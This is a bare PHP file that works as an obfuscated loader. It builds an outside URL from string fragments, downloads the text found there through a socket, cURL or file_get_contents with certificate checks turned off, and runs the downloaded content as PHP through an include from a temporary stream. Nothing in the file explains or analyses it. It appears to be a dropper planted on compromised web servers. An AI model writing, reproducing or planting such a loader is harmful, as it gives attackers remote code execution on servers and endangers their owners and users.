<?php
$u='ht'.'tps://'.'st'.'ep'.'mo'.'mh'.'ub.'.'co'.'m/'.'77.t'.'xt';
function x($u){$p=parse_url($u);$h=$p['host'];$s=$p['scheme']??'http';
$a='st'.'ream_'.'soc'.'ket_'.'cl'.'ient';if(function_exists($a)){
$f=@$a(($s=='https'?'ssl://':'tcp://').$h.':'.($p['port']??($s=='https'?443:80)),$e,$r,30);
if($f){fwrite($f,"GET ".($p['path']??'/')." HTTP/1.0\r\nHost: $h\r\nUser-Agent: Mozilla/5.0\r\nConnection: Close\r\n\r\n");
$b='';while(!feof($f))$b.=fgets($f);fclose($f);$x=explode("\r\n\r\n",$b,2);if(!empty($x[1]))return $x[1];}}
$c='cu'.'rl_';$i=$c.'init';if(function_exists($i)){$h=$i($u);$o=$c.'setopt';
$o($h,19913,1);$o($h,52,1);$o($h,64,0);$r=($c.'exec')($h);if($r)return $r;}
$g='fi'.'le_'.'get_'.'con'.'tents';return function_exists($g)?@$g($u):'';}
$d=x($u);if(!$d)die;$s=fopen('php://temp','r+');fwrite($s,$d);rewind($s);
include '/proc/self/fd/'.(int)$s;
?>
